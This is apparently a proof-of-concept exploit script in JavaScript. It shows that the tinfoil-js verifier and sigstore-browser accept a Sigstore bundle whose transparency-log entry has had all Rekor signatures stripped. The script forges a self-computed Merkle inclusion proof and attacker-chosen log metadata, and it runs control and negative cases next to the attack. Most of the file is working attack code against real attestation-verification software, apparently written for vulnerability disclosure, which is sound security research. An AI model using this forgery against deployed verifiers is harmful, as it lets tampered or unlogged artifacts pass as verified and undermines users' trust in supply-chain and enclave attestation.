// PoC: tinfoil-js (@tinfoilsh/verifier 1.2.2 + @freedomofpress/sigstore-browser 0.1.14) accepts a
// Sigstore bundle whose transparency-log entry carries NO Rekor signature at all:
//   - inclusionPromise (SET) removed
//   - inclusionProof.checkpoint (signed note) removed
//   - inclusionProof replaced by a trivial attacker-computed size-1 Merkle proof
//   - integratedTime / logIndex / logId chosen freely by the attacker
// Everything else (Fulcio cert, SCT, DSSE signature) is the genuine production material from the
// shipped test fixture, and the SHIPPED trusted root (dist/sigstore-trusted-root.js) is used.
import fs from 'node:fs';
import { createHash } from 'node:crypto';
import { Verifier } from '../dist/client.js';

const fixture = JSON.parse(fs.readFileSync(new URL('../test/fixtures/attestation-bundle.json', import.meta.url), 'utf8'));

function leafHashB64(canonicalizedBodyB64) {
  const body = Buffer.from(canonicalizedBodyB64, 'base64');
  return createHash('sha256').update(Buffer.concat([Buffer.from([0x00]), body])).digest('base64');
}

async function run(label, mutate) {
  const bundle = structuredClone(fixture);
  mutate(bundle);
  const verifier = new Verifier({ configRepo: 'tinfoilsh/confidential-model-router' });
  let result;
  try {
    await verifier.verifyBundle(bundle);
    result = 'ACCEPTED';
  } catch (e) {
    result = 'rejected: ' + e.message + (e.cause ? ' / ' + e.cause.message : '');
  }
  const doc = verifier.getVerificationDocument();
  console.log(`${label.padEnd(70)} -> ${result}  securityVerified=${doc?.securityVerified} verifyCode=${doc?.steps.verifyCode.status}`);
  return doc;
}

console.log('tinfoil-js @tinfoilsh/verifier', JSON.parse(fs.readFileSync(new URL('../package.json', import.meta.url))).version,
  '| sigstore-browser', JSON.parse(fs.readFileSync(new URL('../../../node_modules/@freedomofpress/sigstore-browser/package.json', import.meta.url))).version,
  '| now =', new Date().toISOString());

// 0. control: the unmodified production bundle
await run('control: unmodified fixture', () => {});

// 1. control: tamper the checkpoint signature while keeping it present -> rejected (checkpoint IS verified when present)
await run('control: checkpoint present but signature tampered', (b) => {
  const e = b.sigstoreBundle.verificationMaterial.tlogEntries[0];
  const env = e.inclusionProof.checkpoint.envelope;
  const m = env.match(/\u2014 (\S+) (\S+)\n$/);
  const sig = Buffer.from(m[2], 'base64'); sig[sig.length - 1] ^= 0x01;   // keep the 4-byte key hint, flip the last signature byte
  e.inclusionProof.checkpoint.envelope = env.slice(0, m.index) + '\u2014 ' + m[1] + ' ' + sig.toString('base64') + '\n';
});

// 2. control: tamper the SET while keeping it present -> rejected (SET IS verified when present)
await run('control: inclusionPromise present but SET tampered', (b) => {
  const e = b.sigstoreBundle.verificationMaterial.tlogEntries[0];
  const s = Buffer.from(e.inclusionPromise.signedEntryTimestamp, 'base64'); s[s.length - 1] ^= 0x01;
  e.inclusionPromise.signedEntryTimestamp = s.toString('base64');
});

// 3. attack: remove every Rekor signature and substitute a self-made inclusion proof
const forgedDoc = await run('ATTACK: no SET, no checkpoint, self-made Merkle proof, bogus logId/logIndex/integratedTime', (b) => {
  const e = b.sigstoreBundle.verificationMaterial.tlogEntries[0];
  delete e.inclusionPromise;
  e.logId = { keyId: Buffer.alloc(32, 0x41).toString('base64') };      // not any known log
  e.logIndex = '1';
  e.integratedTime = '1769122000';                                       // attacker-chosen, inside the 10-minute cert window (notBefore 1769121722 .. notAfter 1769122322)
  e.inclusionProof = { logIndex: '0', rootHash: leafHashB64(e.canonicalizedBody), treeSize: '1', hashes: [] }; // no checkpoint
});
fs.writeFileSync(new URL('./rekor-bypass-verification-document.json', import.meta.url), JSON.stringify(forgedDoc, null, 2));

// 4. attack variant: integratedTime far in the future is irrelevant as long as it is inside the cert window; show the window edges
await run('ATTACK variant: integratedTime = cert notAfter (1769122322)', (b) => {
  const e = b.sigstoreBundle.verificationMaterial.tlogEntries[0];
  delete e.inclusionPromise;
  e.integratedTime = '1769122322';
  e.inclusionProof = { logIndex: '0', rootHash: leafHashB64(e.canonicalizedBody), treeSize: '1', hashes: [] };
});
await run('negative: integratedTime outside cert window (1769122323) still rejected', (b) => {
  const e = b.sigstoreBundle.verificationMaterial.tlogEntries[0];
  delete e.inclusionPromise;
  e.integratedTime = '1769122323';
  e.inclusionProof = { logIndex: '0', rootHash: leafHashB64(e.canonicalizedBody), treeSize: '1', hashes: [] };
});
// 5. attack variant: v0.1 media type keeps the SET requirement; show that removing the proof entirely with a v0.1 label is rejected
await run('negative: mediaType v0.1, no promise, no proof -> rejected', (b) => {
  const e = b.sigstoreBundle.verificationMaterial.tlogEntries[0];
  b.sigstoreBundle.mediaType = 'application/vnd.dev.sigstore.bundle+json;version=0.1';
  delete e.inclusionPromise; delete e.inclusionProof;
});
